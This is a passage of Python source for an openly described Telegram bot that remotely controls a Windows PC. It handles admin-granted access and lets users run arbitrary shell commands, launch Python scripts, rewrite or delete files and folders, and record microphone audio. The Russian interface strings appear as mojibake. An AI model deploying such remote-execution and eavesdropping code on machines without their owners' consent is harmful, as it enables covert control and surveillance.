                bot.send_message(user_id, f"‚õîÔ∏è –° —Å–æ–∂–∞–ª–µ–Ω–∏–µ–º —Å–æ–æ–±—â–∞–µ–º –í–∞–º, —á—Ç–æ –¥–æ—Å—Ç—É–ø –∫ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—é –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º –¥–ª—è –í–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –±—ã–ª –∞–Ω–Ω—É–ª–∏—Ä–æ–≤–∞–Ω. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –í–∞–º –±–æ–ª—å—à–µ –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∏ –ø—Ä–æ—Ü–µ—Å—Å—ã –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ.\n\n‚ÑπÔ∏è –°–æ–≥–ª–∞—Å–Ω–æ –Ω–∞—à–∏–º –∑–∞–ø–∏—Å—è–º, –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –ø—Ä–∏–Ω—è–ª —Ä–µ—à–µ–Ω–∏–µ –æ–≥—Ä–∞–Ω–∏—á–∏—Ç—å –í–∞—à –¥–æ—Å—Ç—É–ø –ø–æ –ø—Ä–∏—á–∏–Ω–µ –Ω–∞—Ä—É—à–µ–Ω–∏—è —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –ø—Ä–∞–≤–∏–ª –ª–∏–±–æ –ø–æ –¥—Ä—É–≥–æ–π —Å–µ—Ä—å–µ–∑–Ω–æ–π –ø—Ä–∏—á–∏–Ω–µ.")
                return access_control(message)
            else:
                bot.send_message(message.chat.id, f"‚ö†Ô∏è –£–∫–∞–∑–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ —É–∂–µ –ª–∏—à–µ–Ω –¥–æ—Å—Ç—É–ø–∞")
                cursor.close()
                conn.close()
                return access_control(message)
        else:
            bot.send_message(message.chat.id, "‚ùå –î–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –≤ —Å–∏—Å—Ç–µ–º–µ ‚ùå")
            return access_control(message)

    def give_access(message: types.Message):
        if message.text.strip() == back_text: return access_control(message)
        elif message.text.strip() == '/start': return start(message)
        conn = sqlite3.connect('fulldostup.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users_with_access")
        if message.from_user.id == ACCESS:
            bot.send_message(message.chat.id, "üîê –î–ª—è –≤—ã–¥–∞—á–∏ –¥–æ—Å—Ç—É–ø–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–≤–µ—Å—Ç–∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è Telegram. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–º—É —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–∏—Å—Ç–µ–º–µ", reply_markup=back_keyboard)
            bot.register_next_step_handler(message, give_access_step)
        else:
            bot.send_message(message.chat.id, "‚ùå –í–∞–º –∑–∞–ø—Ä–µ—â–µ–Ω –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω–æ–º—É —Ä–∞–∑–¥–µ–ª—É ‚ùå")

    def give_access_step(message: types.Message):
        if message.text.strip() == back_text: return access_control(message)
        elif message.text.strip() == '/start': return start(message)
        user_id = int(message.text)
        if user_id > 0:
            conn = sqlite3.connect('fulldostup.db', check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute("SELECT user_id FROM users_with_access WHERE user_id=?", (user_id,))
            existing_user = cursor.fetchone()

            if existing_user:
                bot.send_message(message.chat.id, "‚ö†Ô∏è –£–∫–∞–∑–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –∏–º–µ–µ—Ç –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø")
                return access_control(message)
            else:
                conn_visitors = sqlite3.connect('visitors.db')
                cursor_visitors = conn_visitors.cursor()
                cursor_visitors.execute("SELECT id FROM visitors WHERE id=?", (user_id,))
                visitor = cursor_visitors.fetchone()

                if visitor:
                    cursor.execute("INSERT INTO users_with_access (user_id) VALUES (?)", (user_id,))
                    conn.commit()
                    bot.send_message(message.chat.id, f"üîê –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é —Å ID {user_id} –±—ã–ª –≤—ã–¥–∞–Ω –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø")

                    bot.send_message(user_id, "üîê –ú—ã —Ä–∞–¥—ã —Å–æ–æ–±—â–∏—Ç—å –í–∞–º, —á—Ç–æ –≤–∞—à–µ–º—É –∞–∫–∫–∞—É–Ω—Ç—É –±—ã–ª –≤—ã–¥–∞–Ω –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—é –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º. –≠—Ç–æ –∑–Ω–∞—á–∏—Ç, —á—Ç–æ —Ç–µ–ø–µ—Ä—å —É –í–∞—Å –ø–æ—è–≤–∏–ª–∞—Å—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∏ –ø—Ä–æ—Ü–µ—Å—Å—ã –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞—Ö.\n\n‚ö†Ô∏è –û–¥–Ω–∞–∫–æ, —Ö–æ—Ç–µ–ª–æ—Å—å –±—ã –Ω–∞–ø–æ–º–Ω–∏—Ç—å, —á—Ç–æ –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –¥–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–µ—Å–µ—Ç–µ –ø–æ–ª–Ω—É—é –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å –∑–∞ –ª—é–±—ã–µ –¥–µ–π—Å—Ç–≤–∏—è, —Å–æ–≤–µ—Ä—à–µ–Ω–Ω—ã–µ –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ. –ú—ã –Ω–µ –Ω–µ—Å–µ–º –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å –∑–∞ –ª—é–±–æ–π —É—â–µ—Ä–± –∏–ª–∏ –ø–æ—Ç–µ—Ä–∏ –¥–∞–Ω–Ω—ã—Ö, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –≤–æ–∑–Ω–∏–∫–Ω—É—Ç—å –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ –≤–∞—à–µ–π –¥–µ—è—Ç–µ–ª—å–Ω–æ—Å—Ç–∏.\n\nüõ° –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –±—É–¥—å—Ç–µ –≤–Ω–∏–º–∞—Ç–µ–ª—å–Ω—ã –∏ –æ—Å—Ç–æ—Ä–æ–∂–Ω—ã –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –¥–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏. –í–∞—à–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ —Å–æ—Ö—Ä–∞–Ω–Ω–æ—Å—Ç—å –¥–∞–Ω–Ω—ã—Ö - –Ω–∞—à –≥–ª–∞–≤–Ω—ã–π –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç.")
                    return access_control(message)
                else:
                    bot.send_message(message.chat.id, "‚ùå –î–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –≤ —Å–∏—Å—Ç–µ–º–µ ‚ùå")
                    return access_control(message)

        else:
            bot.send_message(message.chat.id, "üîí ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–æ–ª–∂–µ–Ω —Å–æ—Å—Ç–æ—è—Ç—å –∏–∑ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω—ã—Ö —á–∏—Å–µ–ª")
            return access_control(message)

    def info_script(message: types.Message):

        if is_access_denied(message.from_user): return None
        bot.send_message(message.chat.id, 'üñ•Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –±–æ—Ç –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º —á–µ—Ä–µ–∑ Telegram! ü§ñ\n\n–≠—Ç–æ—Ç –∏–Ω–Ω–æ–≤–∞—Ü–∏–æ–Ω–Ω—ã–π –±–æ—Ç –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –≤–∞–º –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å —Å–≤–æ–π –∫–æ–º–ø—å—é—Ç–µ—Ä, –≤—ã–ø–æ–ª–Ω—è—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –∏ —É–ø—Ä–∞–≤–ª—è—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏ –ø—Ä—è–º–æ —Å –≤–∞—à–µ–≥–æ –º–æ–±–∏–ª—å–Ω–æ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞. –° –ø–æ–º–æ—â—å—é –¥–∞–Ω–Ω–æ–≥–æ –±–æ—Ç–∞ –≤—ã –º–æ–∂–µ—Ç–µ —É–ø—Ä–∞–≤–ª—è—Ç—å –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏ –Ω–∞ –≤–∞—à–µ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ, –ø–µ—Ä–µ—Å—ã–ª–∞—Ç—å —Ñ–∞–π–ª—ã, –∑–∞–ø—É—Å–∫–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—ã –∏ –º–Ω–æ–≥–æ–µ –¥—Ä—É–≥–æ–µ.\n\nüîí –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–º–Ω–∏—Ç–µ, —á—Ç–æ –≤—Å–µ –¥–µ–π—Å—Ç–≤–∏—è, —Å–æ–≤–µ—Ä—à–∞–µ–º—ã–µ —á–µ—Ä–µ–∑ —ç—Ç–æ—Ç –±–æ—Ç, –ø–æ–¥–≤–µ—Ä–∂–µ–Ω—ã –≤–∞—à–µ–º—É –∫–æ–Ω—Ç—Ä–æ–ª—é –∏ –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏. –ë—É–¥—å—Ç–µ –≤–Ω–∏–º–∞—Ç–µ–ª—å–Ω—ã –∏ –æ—Å—Ç–æ—Ä–æ–∂–Ω—ã –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ —Ñ—É–Ω–∫—Ü–∏–π —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º.\n\nüí° –ù–∞—à –±–æ—Ç —Å–æ–∑–¥–∞–Ω –¥–ª—è –æ–±–ª–µ–≥—á–µ–Ω–∏—è –≤–∞—à–µ–π —Ä–∞–±–æ—Ç—ã –∏ –ø–æ–≤—ã—à–µ–Ω–∏—è —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º. –ù–∞—Å–ª–∞–∂–¥–∞–π—Ç–µ—Å—å —É–¥–æ–±—Å—Ç–≤–æ–º —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º —á–µ—Ä–µ–∑ Telegram –∏ –Ω–µ –∑–∞–±—ã–≤–∞–π—Ç–µ –æ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—è—Ö, –∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –≤–∞–º —ç—Ç–æ—Ç –∏–Ω–Ω–æ–≤–∞—Ü–∏–æ–Ω–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç.\n\nüö® –ü—Ä–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–∏ –æ—à–∏–±–æ–∫ –∏–ª–∏ –≤–æ–∑–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏–∏ –Ω–æ–≤—ã—Ö –∏–¥–µ–π –≤—ã –º–æ–∂–µ—Ç–µ —Å–≤—è–∑–∞—Ç—å—Å—è —Å–æ –º–Ω–æ–π —á–µ—Ä–µ–∑ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä Telegram @resppl.\n\nüë®‚Äçüíª –°–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤—ã–±—Ä–∞–ª–∏ –Ω–∞—à–µ–≥–æ –±–æ—Ç–∞ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º —á–µ—Ä–µ–∑ Telegram!\n\n–° —É–≤–∞–∂–µ–Ω–∏–µ–º,\n–í–∞—à [resppl](https://resppl.ru).\n\n–°–∫—Ä–∏–ø—Ç –Ω–∞ GitHub: [TelegramRemotePC](https://github.com/resppl/telegramremotepc/)\n–°–≤—è–∑–∞—Ç—å—Å—è —Å –≤–ª–∞–¥–µ–ª—å—Ü–µ–º - [@resppl](t.me/resppl)', disable_web_page_preview=True, parse_mode="Markdown")
        
        return start(message)

    def record_audio(record_seconds):
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        WAVE_OUTPUT_FILENAME = "output.wav"

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        frames = []

        for i in range(0, int(RATE / CHUNK * record_seconds)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        return WAVE_OUTPUT_FILENAME

    def console_commands(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)

        try:
            output=subprocess.getoutput(message.text.strip(), encoding='cp866')

            if len(output) > 1999:
                if os.path.exists('C:\\temp\\') == False: make_temp_folder

                bot.send_message(message.chat.id, f'‚òëÔ∏è –ö–æ–º–∞–Ω–¥–∞ *{message.text.strip()}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n\n–û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏ –æ–∫–∞–∑–∞–ª—Å—è *—Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–º* –∏ –±—ã–ª *—Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ —Ñ–∞–π–ª –Ω–∏–∂–µ*!', parse_mode = "Markdown", reply_markup=back_keyboard)
                my_file = open("C:\\temp\\ConsoleOutput.txt", "w", encoding="utf-8")
                my_file.write(output)
                my_file.close()
                bot.send_document(message.chat.id, document = open('C:\\temp\\ConsoleOutput.txt', 'rb'))
                os.remove('C:\\temp\\ConsoleOutput.txt')
                return bot.register_next_step_handler(message, console_commands)

            bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")
            return bot.register_next_step_handler(message, console_commands)

        except:
            bot.send_message(message.chat.id, f'‚òëÔ∏è –ö–æ–º–∞–Ω–¥–∞ *{message.text.strip()}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞\n\n–û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏ –æ–∫–∞–∑–∞–ª—Å—è *–ø—É—Å—Ç–æ–π —Å—Ç—Ä–æ–∫–æ–π*!', parse_mode = "Markdown")
            return bot.register_next_step_handler(message, console_commands)


    def python_scripts(message: types.Message):
        if is_access_denied(message.from_user): return None

        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return console_menu(message)
        
        bot.send_message(message.chat.id, f'‚òëÔ∏è *Python —Å–∫—Ä–∏–ø—Ç –ø–æ –ø—É—Ç–∏ "{message.text.strip()}" –±—ã–ª –∑–∞–ø—É—â–µ–Ω!*', parse_mode = "Markdown")
        console_menu(message)

        try:
            output=subprocess.getoutput(f'python {message.text.strip()}', encoding='cp866')
            bot.send_message(message.chat.id, f'‚òëÔ∏è *Python —Å–∫—Ä–∏–ø—Ç –ø–æ –ø—É—Ç–∏ "{message.text.strip()}" –±—ã–ª —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!\n–õ–æ–≥ –Ω–∏–∂–µ*', parse_mode = "Markdown")
            return bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")

        except: return bot.send_message(message.chat.id, f'‚ùå *Python —Å–∫—Ä–∏–ø—Ç –ø–æ –ø—É—Ç–∏ {message.text.strip()} –Ω–µ –±—ã–ª –∑–∞–ø—É—â–µ–Ω –∏–∑-–∑–∞ –æ—à–∏–±–∫–∏!*', parse_mode = "Markdown")


    def create_file(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return files_menu(message)
            
        try:
            my_file = open(message.text.strip(), "w")
            my_file.close()
            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞!*', parse_mode='Markdown')
            bot.register_next_step_handler(message, create_file_check, message.text.strip())

        except:
            bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç –º–µ—Å—Ç–∞*', parse_mode="Markdown")
            return files_menu(message)

    def create_file_check(message: types.Message, route: str):
        if is_access_denied(message.from_user): return None      
        
        if message.text.strip() == '/start': return start(message)

        with open(route, 'w+', encoding = 'utf-8') as file: file.write(message.text.strip())
        bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{route}* —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω!', parse_mode="Markdown")
        return files_menu(message)


    def change_file_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '*‚úçÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ!*', reply_markup=change_file_menu_keyboard, parse_mode="Markdown")
        return bot.register_next_step_handler(message, change_file_check)
        
    def change_file_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return files_menu(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == change_file_menu_text_add_content: return add_in_file_content(message)
        elif message.text.strip() == change_file_menu_text_clear_file: return clean_file(message)
        elif message.text.strip() == change_file_menu_text_full_edit_content: return change_file(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode="Markdown")
        return change_file_menu(message)


    def change_file(message: types.Message):
        if is_access_denied(message.from_user): return None    
        bot.send_message(message.chat.id, 'üìù *–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞ (–µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–π –ø–∞–ø–∫–µ, –ø—Ä–æ—Å—Ç–æ —É–∫–∞–∂–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ)*', parse_mode="Markdown", reply_markup=back_keyboard)
        return bot.register_next_step_handler(message, change_file_new_content)

    def change_file_new_content(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return change_file_menu(message)

        bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ –Ω–æ–≤–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ!*', parse_mode="Markdown")
        return bot.register_next_step_handler(message, change_file_finish, message.text.strip())

    def change_file_finish(message: types.Message, route: str):
        if is_access_denied(message.from_user): return None
        
        try:
            if message.text.strip() == '/start': return start(message)
            elif message.text.strip() == back_text: return change_file_menu(message)

            with open(route, 'w+', encoding = 'utf-8') as file: file.write(message.text.strip())
            bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{route}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω!', parse_mode="Markdown")
            return change_file_menu(message)

        except:
            bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode="Markdown")
            return change_file_menu(message)


    def clean_file(message: types.Message):
        if is_access_denied(message.from_user): return None    
        bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞ (–µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–π –ø–∞–ø–∫–µ, –ø—Ä–æ—Å—Ç–æ –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ)*', parse_mode="Markdown", reply_markup=back_keyboard)
        return bot.register_next_step_handler(message, clean_file_check)

    def clean_file_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return change_file_menu(message)

        try:
            with open(message.text.strip(), 'w+', encoding = 'utf-8') as file: file.write("")
            bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{message.text.strip()}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ –æ—á–∏—â–µ–Ω!', parse_mode='Markdown')
            return change_file_menu(message)
        
        except:
            bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç*', parse_mode='Markdown')
            return change_file_menu(message)


    def add_in_file_content(message: types.Message):
        if is_access_denied(message.from_user): return None    
        bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º –∏–ª–∏ –ø—É—Ç—å –¥–æ –Ω—É–∂–Ω–æ–≥–æ —Ñ–∞–π–ª–∞*', parse_mode='Markdown', reply_markup=back_keyboard)
        return bot.register_next_step_handler(message, add_in_file_text)

    def add_in_file_text(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text:return change_file_menu(message)

        bot.send_message(message.chat.id, '‚úçÔ∏è *–£–∫–∞–∂–∏—Ç–µ, —á—Ç–æ –Ω—É–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, add_in_file_finish, message.text.strip())

    def add_in_file_finish(message: types.Message, route: str):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return change_file_menu(message)

        try:
            with open(route, 'w+', encoding='utf-8') as file: file.write(message.text.strip()) 
            bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª *{route}* —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω/–∏–∑–º–µ–Ω–µ–Ω!', parse_mode='Markdown')
            return change_file_menu(message)
        
        except:
            bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode='Markdown')
            return change_file_menu(message)


    def delete_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '‚úçÔ∏è *–í—ã–±–µ—Ä–∏—Ç–µ —Ç–æ, —á—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ*', reply_markup=delete_menu_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_delete_menu)

    def check_delete_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return files_menu(message)
        elif message.text.strip() == delete_menu_text_delete_folder: return delete_folder(message)
        elif message.text.strip() == delete_menu_text_delete_file: return delete_file(message)
            
        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return delete_menu(message)


    def delete_file(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É, –∫–æ—Ç–æ—Ä—ã–π –Ω–∞–¥–æ —É–¥–∞–ª–∏—Ç—å (–ª–∏–±–æ –ø—Ä–æ—Å—Ç–æ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º, –µ—Å–ª–∏ –æ–Ω –≤ —Ç–µ–∫—É—â–µ–π –ø–∞–ø–∫–µ)!*', parse_mode='Markdown', reply_markup=back_keyboard)
        return bot.register_next_step_handler(message, delete_file_check)

    def delete_file_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return delete_menu(message)

        try: os.remove(message.text.strip())
        except:
            bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *—Ñ–∞–π–ª –Ω–µ –±—ã–ª –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–æ—Å—Ç—É–ø!*', parse_mode='Markdown')
            return delete_menu(message)
                
        bot.send_message(message.chat.id, f'‚òëÔ∏è –§–∞–π–ª –ø–æ –ø—É—Ç–∏ *{message.text.strip()}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω!', parse_mode = "Markdown")
        return delete_menu(message)


    def delete_folder(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –ø–∞–ø–∫–µ, –∫–æ—Ç–æ—Ä—É—é –Ω–∞–¥–æ —É–¥–∞–ª–∏—Ç—å!*', parse_mode='Markdown', reply_markup=back_keyboard)
        return bot.register_next_step_handler(message, delete_folder_check)

    def delete_folder_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return delete_menu(message)
            
        try: rmtree(message.text.strip())
        except:
